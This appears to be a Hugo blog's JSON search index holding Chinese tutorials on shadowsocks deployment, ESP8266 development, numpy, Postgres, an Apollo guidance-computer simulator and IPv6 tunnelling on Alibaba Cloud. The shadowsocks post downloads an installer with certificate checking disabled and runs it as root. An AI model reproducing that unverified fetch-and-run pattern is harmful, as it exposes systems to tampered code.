YouTube\n本文中程序的完整代码可以在github上面找到。\n", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/8266\/esp8266_mqtt\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/technology\/": {
        
        "title": "Technology",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/technology\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/setup_shadowsocks_server\/": {
        
        "title": "如何在CentOS上部署shadowsocks服务",
            "tags": [ "Technology",  "DevOps", ],
    "content": "shadowsocks简单介绍 shadowsocks是目前较流行的一种科学上网服务。他的工作原理也比较简单，shadowsocks本质上是socks5代理技术，然而架构方式上将单服务节点拆分成两个子服务：SS Local和SS Server。\n工作过程如下：\n当本地请求端需要访问时首先将请求发送至本地SS Local服务 SS Local将数据加密在网络上传输到SS Server，由于信息经过加密不会被GFW提取到特征数据，因此也就翻了墙 SS Server收到数据后解密并访问真正的远程服务资源 远程返回数据返回到SS Server SS Server将数据加密传输给SS Local SS Local收到返回数据解密后发给本地请求端 部署shadow socks服务 (SS Server) 安装服务 shadowsocks服务的部署也极为简单，已经有完善的脚本帮助安装，需要稍微注意下的就是安装过程需要root权限，安装方法如下：\n# wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh # sh shadowsocks.sh 配置服务 shadowsocks的配置文件是\u0026rsquo;/etc/shadowsocks.json\u0026rsquo;，一个简单的配置文件的写法可以参考这个例子。\n# cat /etc/shadowsocks.json { \u0026#34;server\u0026#34;:\u0026#34;0.0.0.0\u0026#34;, \u0026#34;port_password\u0026#34;:{ \u0026#34;8989\u0026#34;:\u0026#34;password1\u0026#34;, \u0026lt;--- 第一个服务端口及访问密码 \u0026#34;8990\u0026#34;:\u0026#34;password2\u0026#34; \u0026lt;--- 多个服务端口指定方法 }, \u0026#34;timeout\u0026#34;:300, \u0026#34;method\u0026#34;:\u0026#34;aes-256-cfb\u0026#34;, \u0026lt;--- 注意这个加密方式，配置SS Local需要使用 \u0026#34;fast_open\u0026#34;:false, \u0026#34;workers\u0026#34;:2 } 多数情况下一个端口就可以满足使用了，这个例子中提供了多个访问端口的配置方法，具体用法可以根据自己的实际情况配置。\n启动服务 服务安装过程同时会安装一个启动脚本\u0026rsquo;/etc/init.d/shadowsocks\u0026rsquo;，启动方法也很简单。\n# service shadowsocks start 为了确保每次系统启动后服务会自动运行最好将服务使用chkconfig进行启用，这样就不必担心系统被运营商或者管理员维护重启后无法使用了。\nchkconfig --add shadowsocks chkconfig --level 2345 shadowsocks on 客户端使用方法（SS Local） 本人使用的是MBP，先分享一下Mac OS上的使用方法。\n下载安装SS Local 可以在这里下载ShadowsocksX-NG这个软件，将这个软件安装到应用程序中就可以打开使用了，但首先需要一些设置。\n配置SS Local 程序运行后可以看到一个小飞机样子的图标，点击后可以看到配置菜单。\n第一步：打开配置界面 第二步：配置SS Local连接的SS Server服务器 点击“服务器设置”\n将配置好的服务填入其中，注意的是“地址”／“端口号”／“加密方法”／“密码”信息需要与SS Server服务端的设置匹配。\n配置完成后记得在服务器列表中选择刚刚配置好的那项。\n第三步：设置“高级服务” 国内用户最好指定\u0026quot;GFW LIST URL\u0026quot;\nhttps://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 注意，这里有一个\u0026quot;Local PAC Listen Port\u0026quot;信息，这个配置需要在下面一步使用。\n第四步：设置本地代理方式 设置本地代理方式之前最好先将GFW list更新一下\n打开“系统偏好设置”-\u0026gt;“网络”-\u0026gt;“高级”-\u0026gt;“代理”，勾选“自动代理配置”，在URL中输入：http://127.0.0.1:8090/proxy.pac\n完成这个设置后就已经可以进行科学上网了，系统访问GFW屏蔽的服务时就会使用配置好的代理服务器。\n使用kcptun加速 有些时候shadowsocks搭建的主服务器在国外机房中的延迟较大，这样会影响访问速度，这时可以使用一些手段为访问加速，比如\u0026quot;kcptun\u0026quot;。\nTBC\n", 
    "url": "http:\/\/localhost:1313\/post\/network\/setup_shadowsocks_server\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/8266\/nodemcu_devenv_on_arduino_ide\/": {
        
        "title": "使用Arduino IDE进行nodeMCU开发",
            "tags": [ "ESP8266",  "8266",  "nodeMCU", ],
    "content": "安装Arduino IDE 这两天发现使用Arduino IDE开发nodeMCU(ESP 8266)非常方便，写出来分享一下。\n1.下载arduino IDE\nArduino IDE可以在Arduino官网下载到。\n2.配置开发板管理器网址\n打开preference，用下面的URL设置“附加开发模版管理器网址”：\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json 3.下载更新8266开发模版\n打开“工具”-\u0026gt;“开发板”-\u0026gt;“开发板管理器”，选择“esp8266”并安装。\n安装完后在“工具”-\u0026gt;“开发板”中选择对应的开发板型号。\n安装USB to UART驱动 nodeMCU自带Silicon Labs的USB芯片，可以直接使用microUSB进行连接，这对于不太熟悉硬件的爱好者是非常友好的。\n连接前需要在这里下载驱动：nodeMCU USBtoUART驱动\n设置UART端口 现在拿出一根microUSB线将nodeMCU连接到电脑上吧。\n此时在Arduino IDE中还需要进行最后一个简单设置：“端口”。设置好这个端口后就可以跟板子进行串口通讯了。\n设置过程通过“工具”-\u0026gt;“端口”进行选择。通常情况下应该选择类似\u0026quot;/dev/cu.SLAB_USBtoUART\u0026quot;字样的那个端口。\n开发烧录程序 首先用Arduino IDE自带的例子程序进行说明开发过程。选择\u0026quot;文件\u0026quot;-\u0026gt;\u0026ldquo;示例\u0026rdquo;-\u0026gt;\u0026ldquo;01.Basics\u0026rdquo;-\u0026gt;\u0026ldquo;Blink\u0026rdquo;，将会打开\u0026quot;Blink\u0026quot;例子程序。\n由于nodeMCU的LED灯连在16号管脚上，因此需要简单修改一下这个例子。\n#define ESP8266_LED_BUILTIN 16 // the setup function runs once when you press reset or power the board void setup() { // initialize digital pin LED_BUILTIN as an output. pinMode(ESP8266_LED_BUILTIN, OUTPUT); } // the loop function runs over and over again forever void loop() { digitalWrite(ESP8266_LED_BUILTIN, HIGH); // turn the LED on (HIGH is the voltage level) delay(500); // wait for 0.5 second digitalWrite(ESP8266_LED_BUILTIN, LOW); // turn the LED off by making the voltage LOW delay(500); // wait for 0.5 second } 最后来把写好的程序编译烧录到nodeMCU中吧。点击“上传”按钮将会自动完成这个步骤。\n", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/8266\/nodemcu_devenv_on_arduino_ide\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/esp-open-sdk\/": {
        
        "title": "Esp-Open-Sdk",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/esp-open-sdk\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/8266\/setup_esp8266_devenv_on_mac_os\/": {
        
        "title": "在Mac OS上设置ESP 8266开发环境",
            "tags": [ "ESP8266",  "8266",  "esp-open-sdk", ],
    "content": "做物联网产品开发有段时间了，虽然开发了两款智能产品，但hands-on的开发一直都在服务器和应用层进行，硬件层的研发并没有真的深入下去。决定有时间也对这个层面学习学习，软硬都能搞才算得上是全栈吧 :-P\n要完成一个物联网产品的开发需要解决联网的问题。目前解决联网的比较常用的方案有Wi-Fi和GSM两种（NB-IOT也在上升势头，相信一年后会有较多的应用出现）。这次先学习下乐鑫ESP 8266 WI-FI芯片的开发。\n由于我用的是Mac OS，所以就介绍如何在Mac上进行8266的环境设置。\n安装使用esp-open-sdk 1.安装依赖关系\nbrew install gnu-sed --with-default-names brew tap homebrew/dupes brew install gperf brew install grep brew install autoconf brew install binutils brew install gawk brew install wget brew install automake brew install libtool brew install help2man 参考\n2.准备case-sensitive分区\n由于Mac OS的分区默认是case-insensitive的，而编译需要在case-sensitive的分区上进行，所以需要创建一个独立分区解决这个问题(linux系统上没有这个问题)。\nhdiutil create ~/Desktop/eos.dmg -volname \u0026#34;esp-open-sdk\u0026#34; -size 10g -fs \u0026#34;Case-sensitive HFS+\u0026#34; hdiutil mount ~/Desktop/eos.dmg cd /Volumes/esp-open-sdk 3.编译esp-open-sdk\n下载代码库，使用\u0026rsquo;\u0026ndash;recursive\u0026rsquo;会同时下载crosstool-NG／esp-open-lwip／esptool／lx106-hal子模块\ngit clone --recursive https://github.com/pfalcon/esp-open-sdk.git 编译有两种方式：\n方式一(STANDALONE=y)：将toolchain与SDK一起编译安装，这种方式操作简单方便，而且后期开发编译时不需要指定-I／-L参数，缺点是不便于今后SDK升级。 make STANDALONE=y 方式二(STANDALONE=n)：只编译Xtensa toolchain，不编译8266 SDK，这种方式便于今后SDK升级。 make STANDALONE=n 编译完成后会在当前目录下生成\u0026rsquo;xtensa-lx106-elf\u0026rsquo;目录，将\u0026rsquo;xtensa-lx106-elf/bin\u0026rsquo;添加到PATH环境变量中以便开发时使用编译器\u0026rsquo;xtensa-lx106-elf-gcc'\nexport PATH=$PATH:`pwd`/xtensa-lx106-elf/bin/ 最后，esptool.py使用需要安装\u0026rsquo;pySerial\u0026rsquo;这个python库\npip install pyserial 4.测试开发环境\nesp-open-sdk自带example，可以编译一下来测试开发环境是否设置好了\ncd examples/blinky make 如果编译成功通过则说明esp-open-sdk安装成功了。\n使用ESP8266 RTOS SDK 8266还有一套基于FreeRTOS的SDK，配置这套SDK之前需要先完成前面的esp-open-sdk的配置。\n1.构建SDK\n我选择把这套SDK构建到同一个分区上。\ncd /Volumes/esp-open-sdk git clone https://github.com/espressif/ESP8266_RTOS_SDK.git 完成后需要设置两个环境变量\u0026rsquo;SDK_PATH\u0026rsquo;, \u0026lsquo;BIN_PATH\u0026rsquo;。为了简化设置我把这连个环境变量设知道\u0026rsquo;~/.bash_profile\u0026rsquo;文件中，这样可以每次打开shell后自动加载：\n# ESP 8266 dev env ESP_8266_OPEN_SDK=/Volumes/esp-open-sdk/esp-open-sdk/xtensa-lx106-elf/ ESP_8266_RTOS_SDK=/Volumes/esp-open-sdk/ESP8266_RTOS_SDK ESP_8266_RTOS_SDK_BIN=/Volumes/esp-open-sdk/ESP8266_RTOS_BIN export SDK_PATH=$ESP_8266_RTOS_SDK export BIN_PATH=$ESP_8266_RTOS_SDK_BIN PATH=$PATH:$ESP_8266_OPEN_SDK/bin 2.开发方法\nRTOS SDK的代码目录中有一个样板程序，开发时可以把这个模版拷贝到开发目录中，然后运行gen_misc.sh进行编译。\ncp -r examples/project_template ~/test cd ~/test/project_template sh gen_misc.sh 运行gen_misc.sh后会有若干选项，按照提示操作下去最后就会编译出的文件会放到‘BIN_PATH’目录下\nls /Volumes/esp-open-sdk/ESP8266_RTOS_BIN/ eagle.S eagle.dump eagle.flash.bin eagle.irom0text.bin 烧录程序 串口驱动 烧录前需要先将硬件连到电脑上，如果使用的是nodeMCU的话会比较方便，只需要使用一根micro USB数据线，并下载这个驱动：nodeMCU USBtoUART驱动\n烧录工具esptool.py 安装完驱动后就可以连接烧录了，程序烧录可以使用esptool.py工具完成，使用方法如下：\nesptool.py --port \u0026lt;serial-port-of-ESP8266\u0026gt; write_flash -fm \u0026lt;mode\u0026gt; 0x00000 \u0026lt;nodemcu-firmware\u0026gt;.bin 参考资料 esp-open-sdk ESP8266-RTOS-SDK ", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/8266\/setup_esp8266_devenv_on_mac_os\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/python\/numpy\/": {
        
        "title": "numpy学习笔记[1]",
            "tags": [ "numpy", ],
    "content": "numpy数据结构 基本数据 数据类型 描述 bool 用一个字节存储的布尔类型（True或False） inti 由所在平台决定其大小的整数（一般为int32或int64） int8 一个字节大小，-128 至 127 int16 整数，-32768 至 32767 int32 整数，-2 ** 31 至 2 ** 32 -1 int64 整数，-2 ** 63 至 2 ** 63 - 1 uint8 无符号整数，0 至 255 uint16 无符号整数，0 至 65535 uint32 无符号整数，0 至 2 ** 32 - 1 uint64 无符号整数，0 至 2 ** 64 - 1 float16 半精度浮点数：16位，正负号1位，指数5位，精度10位 float32 单精度浮点数：32位，正负号1位，指数8位，精度23位 float64或float 双精度浮点数：64位，正负号1位，指数11位，精度52位 complex64 复数，分别用两个32位浮点数表示实部和虚部 complex128或complex 复数，分别用两个64位浮点数表示实部和虚部 array ‘array’表示元素数据大小固定的同质（相同数据类型）多维度数据。\n\u0026gt;\u0026gt;\u0026gt; from numpy import * \u0026gt;\u0026gt;\u0026gt; g = array([[1,2],[3,4],[5,6],[7,8]], dtype=int64) # ndim: 数组的维度数 \u0026gt;\u0026gt;\u0026gt; g.ndim 2 # shape: 数组在行／列各维度上的大小 \u0026gt;\u0026gt;\u0026gt; g.shape (4, 2) # size: 数组包含的元素个数 \u0026gt;\u0026gt;\u0026gt; g.size 8 # dtype: 数组中元素的数据类型 \u0026gt;\u0026gt;\u0026gt; g.dtype dtype(\u0026#39;int64\u0026#39;) # itemsize: 数组中元素的数据大小（字节） \u0026gt;\u0026gt;\u0026gt; g.itemsize 8 # data：数组中数据的buffer \u0026gt;\u0026gt;\u0026gt; bytes(g.data) \u0026#39;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; # min(): 按照输入的轴（维度）对数据进行排序，输出最小的维度 \u0026gt;\u0026gt;\u0026gt; g3 array([[3, 5], [1, 6], [7, 1], [9, 0]]) # min(0): 将每列数据在列方向上进行排序后输出最小的一行（第0维） \u0026gt;\u0026gt;\u0026gt; g3.min(0) array([1, 0]) # min(1): 将每行数据在行方向上进行排序后输出最小的一列（第1维） \u0026gt;\u0026gt;\u0026gt; g3.min(1) array([3, 1, 1, 0]) numpy函数 tile **功能：**将数组的“秩”在（行，列）方向上进行堆叠扩展\n\u0026gt;\u0026gt;\u0026gt; from numpy import * \u0026gt;\u0026gt;\u0026gt; g = array([[1,2],[3,4],[5,6],[7,8]]) \u0026gt;\u0026gt;\u0026gt; g array([[1, 2], [3, 4], [5, 6], [7, 8]]) # 行和列保持和原来一样 \u0026gt;\u0026gt;\u0026gt; tile(g,(1,1)) array([[1, 2], [3, 4], [5, 6], [7, 8]]) # 行保持一样，列方向堆叠为原来2倍 \u0026gt;\u0026gt;\u0026gt; tile(g,(1,2)) array([[1, 2, 1, 2], [3, 4, 3, 4], [5, 6, 5, 6], [7, 8, 7, 8]]) # 行和列方向都堆叠为原来2倍 \u0026gt;\u0026gt;\u0026gt; tile(g,(2,2)) array([[1, 2, 1, 2], [3, 4, 3, 4], [5, 6, 5, 6], [7, 8, 7, 8], [1, 2, 1, 2], [3, 4, 3, 4], [5, 6, 5, 6], [7, 8, 7, 8]]) ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/python\/numpy\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/postgres\/": {
        
        "title": "Postgres",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/postgres\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/postgres\/": {
        
        "title": "Postgres",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/postgres\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/database\/postgres\/": {
        
        "title": "postgres数据库使用指南",
            "tags": [ "postgres", ],
    "content": "在此省略postgres数据库的安装过程。\n1. 初始化数据库环境 安装完postgres后需要先初始化数据库的环境，可以使用命令行工具 initdb 完成。\ninitdb \u0026lt;DB env path\u0026gt; 2. 数据库管理 2.1 创建数据库 方法1：使用命令行 createdb ，并直接指定用户\ncreatedb -O \u0026lt;DB user\u0026gt; \u0026lt;DB name\u0026gt; 方法2：使用 SQL 创建\npostgres# CREATE DATABASE xxxx2; 创建时指定数据库的拥有人：\npostgres# CREATE DATABASE exampledb OWNER dbuser; 2.2 删除数据库 dropdb \u0026lt;DB name\u0026gt; 3. 用户及权限管理 3.1 添加用户 初始化完数据库环境后需要创建用户，之后再进行数据库创建和使用。\n有两种方法可以创建用户：\n方法1:使用命令行 createuser\ncreateuser --interactive 按照提示信息一步步进行用户信息的输入就可以了。\n方法2:使用命令行工具\nsudo -s -u postgres psql postgres# CREATE USER xxxx1 WITH PASSWORD \u0026#39;xxxx\u0026#39;; 3.2 删除用户 dropuser \u0026lt;DB user\u0026gt; 3.3 设置用户访问数据库密码 方法1：使用内建命令设置密码\n$ psql \u0026lt;DB name\u0026gt; \u0026lt;DB name\u0026gt;=\u0026gt; \\password dbuser 方法2：使用SQL设置密码\npostgres# create user dbuser with password \u0026#39;password\u0026#39;; 修改密码：\npostgres# alter user dbuser with password \u0026#39;password\u0026#39;; 3.4 设置访问权限 postgres# GRANT ALL PRIVILEGES ON DATABASE xxxx2 to xxxx1; 4 数据库运行 启动：\npg_ctl start -D /usr/local/var/postgres -l /usr/local/var/log/postgres.log 停止：\npg_ctl stop -D /usr/local/var/postgres ", 
    "url": "http:\/\/localhost:1313\/post\/database\/postgres\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/tensorflow\/tensorflow\/": {
        
        "title": "tensorflow playground",
            "tags": [ "Machine Learning",  "tensorflow", ],
    "content": "Tensorflow playground，感受一下machine learning的奇特之处：http://playground.tensorflow.org\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/tensorflow\/tensorflow\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/agc\/": {
        
        "title": "AGC",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/agc\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/apollo\/": {
        
        "title": "Apollo",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/apollo\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/lunar\/": {
        
        "title": "Lunar",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/lunar\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/projects\/": {
        
        "title": "Projects",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/projects\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/apollo_guidance_computer\/": {
        
        "title": "玩转阿波罗11号飞船导航计算机模拟器",
            "tags": [ "Apollo",  "AGC",  "Lunar", ],
    "content": "\nPS： 上个周末还在听王冠红人馆调侃河南空气质量监督特别小组的禁放政策出台3天后就撤销的节目，心想今年过年回家乡鞭炮还可以照常放，没想到还真的全面禁放了。没办法放鞭炮咱就“发射个火箭”玩玩吧:-)\n前两天在Github上看到一个有趣的项目，是当年美国登月计划“阿波罗号”的导航计算机的源代码，并且Virtual AGC MIT museum还开发了运行用的模拟器，使用这个模拟器能够运行导航计算机中的“指令模块”和“登月模块”。\n估计很多人看过下面的张照片。没错，那等身的汇编代码现在可以在这个项目里面看到了！ 那么这个程序究竟是干什么的呢？要知道飞往月球并返回地球依靠宇航员手动是不可能的事情，当然也没有什么GPS，飞船必须沿着预定轨道航行才可以，这个程序就是保证飞船正确航行的导航程序。MIT仪器实验室为阿波罗计划开发了这套导航系统，这套导航计算机也叫“AGC (Apollo Guidance Computer)”，飞船上有有两套这样的导航系统，分别运行了不同的程序，一个是CM (Command Module)用来把宇航员送往月球并且返回，另一个是LM (Lunar Module)用来把宇航员送到月球表面并且返回飞船。\n先来看看这货到底长什么样子吧。PS: 体格上好像当年玩过的EMC 60块盘的DAE\u0026hellip; 2048字（不到4kB）的内存 36,864字（不到72kB）的只读存储 每秒钟最多可执行85,000条指令 尺寸: 24\u0026quot;×12.5\u0026quot;×6\u0026quot; (英寸). 重达70.1磅 使用28V 2.5A的直流电 显示器和键盘(DSKY)看起来就跟一个普通计算器差不多。 故事先讲到这儿，来看看怎样把这个模拟器跑起来吧。\n1. 下载代码库 1$ git clone https://github.com/virtualagc/virtualagc.git 2. 编译代码 我使用的环境是CentOS 6.5，为了编译通过需要对Makefile做一些小的修改： 1$ cd virtualagc 2$ git diff Makefile yaAGCb1/Makefile 3diff --git a/Makefile b/Makefile 4index 773edf2..0e9ff8c 100644 5--- a/Makefile 6+++ b/Makefile 7@@ -321,7 +321,7 @@ LIBS+=-lwsock32 8 CURSES=../yaAGC/random.c 9 CURSES+=-lregex 10 else 11-CURSES=-lcurses 12+CURSES=-lncurses 13 endif 14 15 ifdef MACOSX 16diff --git a/yaAGCb1/Makefile b/yaAGCb1/Makefile 17index faf4c5e..e779b0b 100644 18--- a/yaAGCb1/Makefile 19+++ b/yaAGCb1/Makefile 20@@ -24,7 +24,7 @@ endif 21 all default: ${TARGETS} 22 23 yaAGCb1: $(SOURCE) $(HEADERS) Makefile 24- ${cc} ${CFLAGS0} -O0 -g -o $@ $(SOURCE) -lpthread $(LIBS) 25+ ${cc} ${CFLAGS0} -O0 -g -o $@ $(SOURCE) -lpthread -lrt $(LIBS) 26 27 test.agc.bin: test.agc 28 ../../virtualagc/yaYUL/yaYUL --block1 $^ \u0026gt;test.agc.lst\n编译 1$ make 2$ make install 完成后会在用户目录下出现\u0026quot;VirtualAGC\u0026quot;目录，可运行程序都被安装到这个目录下。\n3. 飞向月球吧 运行bin目录下的VirtualAGC即可运行起来。 1$ ./bin/VirtualAGC 列几个CM的命令：\n命令 功能 V05N09E 查看报警代码 V35E DSKY灯管测试 V91E V33E 查看内存bank检矫码，使用V33E指令来选择其他内存bank V16N36E/V16N65E 查看系统当前时间 V25N36E 设置时间 V27N02E 查看core-rope中的内容，通过键盘在R3中输入8进制的地址来查看其中的内容 V01N02E 查看可擦写内存中的内容 V21N02E 修改内存的内容 V36E 重启 完整的命令列表可以在Github上的代码中ASSEMBLY_AND_OPERATION_INFORMATION.s看到。\n几个LM的命令：\n命令 功能 V35E DSKY灯管测试 V37E 00E 启动P00号程序 V25E N01E 01365E 0E 0E 0E 设置自检测试失败次数 V21 N27E 10E 启动自检程序 V21 N27E 0E 关闭自检程序 完整的命令列表可以在Github上的代码中ASSEMBLY_AND_OPERATION_INFORMATION.s看到。\n", 
    "url": "http:\/\/localhost:1313\/post\/apollo_guidance_computer\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ipv6\/": {
        
        "title": "IPv6",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ipv6\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/network\/": {
        
        "title": "Network",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/network\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E9%98%BF%E9%87%8C%E4%BA%91\/": {
        
        "title": "阿里云",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E9%98%BF%E9%87%8C%E4%BA%91\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/ipv6_support\/": {
        
        "title": "阿里云ECS EIP服务进行IPv6改造的方法",
            "tags": [ "IPv6",  "Network",  "阿里云", ],
    "content": "最近团队开发的APP提交到苹果APP store时被拒了，原因是不支持IPv6的访问。原来苹果App store从2016年6月开始强制新上线APP支持IPv6网络，但由于IPv6基础设施在国内的推广非常缓慢，因此导致了该问题。\nIPv6介绍 为了理解IPv6需要先了解其产生的原因，就是IPv4地址资源的问题。IPv4的网络使用32位的地址空间（XX.XX.XX.XX），因此最大支持的数量是4,294,967,296（2^32个），其中还有1800多万个私有地址和2.7亿个多播地址。互联网的发展显然超出了普通的32位地址空间的容量，IPv6地址使用128位的地址空间，这意味着几乎取之不尽的地址空间。另外IPv6比IPv4还进行了很多的改进与扩充。\nIPv6地址 冒分16进制表示法（XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX:XXXX），每个部分中的0可以省略。比如：2001:0DB8:0000:0023:0008:0800:200C:417A 可以缩写为2001:DB8:0:23:8:800:200C:417A\n0位压缩。如果地址中包含很多连续的0，可以把0压缩为\u0026quot;::\u0026quot;，并且\u0026quot;::\u0026ldquo;只能出现1次。 比如 FF01:0:0:0:0:0:0:1101 可以缩略为 FF01::1101\n内嵌IPv4地址表示法。为了实现IPv4-IPv6互通，IPv4地址会嵌入IPv6地址中，此时地址常表示为：X:X:X:X:X:X:d.d.d.d，前96b采用冒分十六进制表示，而最后32b地址则使用IPv4的点分十进制表示，例如::192.168.0.1与::FFFF:192.168.0.1就是两个典型的例子，注意在前96b中，压缩0位的方法依旧适用。\nIPv6地址分类 地址类型 IPv4 IPv6 单播(unicast) Yes Yes 组播(multicast) Yes Yes 任播(anycast) No Yes 广播 Yes No (通过组播来达到类似目的) IPv6的地址类型通过地址的前缀进行区别\nIPv6地址类型 前缀标识 Loopback (unicast) ::1/128 Link local (unicast) FE80::/10 Site local (unicast) FEC0::/10 Global (unicast) multicast FF00::/8 anycast 从单播地址空间中分配 IPv4 vs IPv6 IPv6比IPv4的优势：\nIPv6具有更大的地址空间。IPv4中规定IP地址长度为32，最大地址个数为2^32；而IPv6中IP地址的长度为128，即最大地址个数为2^128。与32位地址空间相比，其地址空间增加了2^128-2^32个。\nIPv6使用更小的路由表。IPv6的地址分配一开始就遵循聚类（Aggregation）的原则，这使得路由器能在路由表中用一条记录（Entry）表示一片子网，大大减小了路由器中路由表的长度，提高了路由器转发数据包的速度。\nIPv6增加了增强的组播（Multicast）支持以及对流的控制（Flow Control），这使得网络上的多媒体应用有了长足发展的机会，为服务质量（QoS，Quality of Service）控制提供了良好的网络平台。\nIPv6加入了对自动配置（Auto Configuration）的支持。这是对DHCP协议的改进和扩展，使得网络（尤其是局域网）的管理更加方便和快捷。\nIPv6具有更高的安全性。在使用IPv6网络中用户可以对网络层的数据进行加密并对IP报文进行校验，在IPV6中的加密与鉴别选项提供了分组的保密性与完整性。极大的增强了网络的安全性。\n允许扩充。如果新的技术或应用需要时，IPV6允许协议进行扩充。\n更好的头部格式。IPV6使用新的头部格式，其选项与基本头部分开，如果需要，可将选项插入到基本头部与上层数据之间。这就简化和加速了路由选择过程，因为大多数的选项不需要由路由选择。\n新的选项。IPV6有一些新的选项来实现附加的功能[14] 。\n阿里ECS EIP 服务IPv6支持方法 6in4隧道方式 6in4的方法是将IPv6的数据包包裹在IPv4的数据包中在IPv4的网络上传输，并通过IPv4/IPv6的网络交界处部署的tunnel broker进行疯转转发，基本工作原理如下：\nIPv6网络上的客户端对服务进行访问时发送IPv6数据包，数据包到达tunnel broker的服务器端，broker将数据包进行IPv4的封装通过隧道发送到你的IPv4服务器端，在隧道的另一端进行IPv6数据包的应用层处理。 你的服务器收到数据包进行应用层处理后将相应数据包进行IPv6封装，再通过隧道包裹成IPv4的数据报文进行隧道传输，当数据包抵达IPv4/IPv6的网络交界处的tunnel broker时，tunnel broker将IPv6的包解析出来在IPv6的网络上进行传递到达IPv6的客户端。 下面我们以6in4的方式对阿里云ECS服务器上使用EIP的服务进行IPv6改造。\n1. 创建tunnel 到tunnelbroker注册账号，并且创建一个新的常规(Regular) tunnel。创建时候需要在\u0026rsquo;IPv4 Endpoint\u0026rsquo;栏填入服务器的公网IPv4地址，并在\u0026rsquo;Available Tunnel Servers\u0026rsquo;中选择一个适合自己的服务器区域，过程如下图： 创建完成后的tunnel包含了几个重要的信息：\nServer IPv4 Address: 这个是tunnel服务端的IPv4地址，创建tunnel的时候需要用到。 Server IPv6 Address: 这个是tunnel的服务端IPv6地址。 Client IPv4 Address: 这个是tunnel客户端的IPv4地址。 Client IPv6 Address: 这个地址需要设置在CentOS服务器的tunnel上面，也是后面DNS服务器需要设置的AAAA记录对应的地址。 2. 解除阿里云主机IPv6限制 阿里云的CentOS主机默认状态下是把IPv6给禁掉的，可以使用下面的脚本先把系统的IPv6功能打开。\n1#!/bin/sh 2 3mkdir ipv6 4mv /etc/modprobe.d/disable_ipv6.conf ipv6/ 5modprobe ipv6 6 7cp /etc/sysctl.conf ipv6/ 8cat /etc/sysctl.conf | sed -e \u0026#39;s/disable_ipv6 = 1/disable_ipv6 = 0/\u0026#39; \u0026gt; 9/etc/.sysctl.conf.bak 10mv -f /etc/.sysctl.conf.bak /etc/sysctl.conf 11sysctl -p /etc/sysctl.conf 完成上面配置后可以用\u0026rsquo;ifconfig\u0026rsquo;检验一下网络接口，如果出现\u0026rsquo;inet6\u0026rsquo;类型的信息说明配置已经生效。\n3. 配置CentOS服务器端tunnel 这里顺带介绍一下Linux支持的几种隧道：\nIP隧道：通过将IPv4数据包封装进另一个IPv4数据包中进行发送，实现两个互不连通的IP网络之间的连接。但是不能通过隧道进行广播或者IPv6数据包的发送。 SIT隧道：将IPv6数据包封装进IPv4数据包中，对应6in4的场景。 GRE隧道：最初是由cisco开发的隧道协议，能够进行多播及IPv6数据包的发送。 这次主要介绍\u0026quot;SIT\u0026quot;隧道的方案。现在需要用到上面创建tunnel时的\u0026rsquo;Server IPv4 Address\u0026rsquo;/\u0026lsquo;Client IPv4 Address\u0026rsquo;/\u0026lsquo;Client IPv6 Address\u0026rsquo;，在你的ECS主机上面运行下面的命令：\n1ip tunnel add he-ipv6 mode sit remote [Server IPv4 Address] local [Client IPv4 Address] ttl 255 2ip link set he-ipv6 up 3ip addr add [Client IPv6 Address]/64 dev he-ipv6 4ip route add ::/0 dev he-ipv6 5ip -f inet6 addr 完成这一步后已经可以对\u0026rsquo;[Client IPv6 Address]\u0026lsquo;进行访问了，可以通过\u0026rsquo;ping6\u0026rsquo;或者\u0026rsquo;curl\u0026rsquo;进行验证。\n1# ping6 [Client IPv6 Address] 2# curl --globoff -6 [Client IPv6 Address] 4. 设置DNS AAAA记录 